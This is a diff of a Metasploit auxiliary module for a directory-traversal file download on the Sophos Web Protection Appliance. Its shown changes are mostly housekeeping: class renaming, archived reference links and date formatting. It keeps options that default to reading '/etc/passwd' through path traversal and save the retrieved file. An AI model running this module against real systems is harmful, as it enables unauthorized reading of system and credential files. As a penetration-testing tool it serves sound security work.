@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'uri'
-require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
@@ -31,20 +29,20 @@ class Metasploit3 < Msf::Auxiliary
           [ 'OSVDB', '91953' ],
           [ 'BID', '58833' ],
           [ 'EDB', '24932' ],
-          [ 'URL', 'http://www.sophos.com/en-us/support/knowledgebase/118969.aspx' ],
-          [ 'URL', 'https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130403-0_Sophos_Web_Protection_Appliance_Multiple_Vulnerabilities.txt' ]
+          [ 'URL', 'https://web.archive.org/web/20130603041204/http://www.sophos.com/en-us/support/knowledgebase/118969.aspx' ],
+          [ 'URL', 'https://web.archive.org/web/20140701204340/https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130403-0_Sophos_Web_Protection_Appliance_Multiple_Vulnerabilities.txt' ]
         ],
       'DefaultOptions' => {
         'SSL' => true
       },
-      'DisclosureDate' => 'Apr 03 2013'))
+      'DisclosureDate' => '2013-04-03'))
 
     register_options(
       [
         Opt::RPORT(443),
         OptString.new('FILEPATH', [true, 'The name of the file to download', '/etc/passwd']),
         OptInt.new('DEPTH', [true, 'Traversal depth', 2])
-      ], self.class)
+      ])
   end
 
   def my_basename(filename)
@@ -120,5 +118,4 @@ class Metasploit3 < Msf::Auxiliary
     print_good("File saved in: #{path}")
 
   end
-
 end
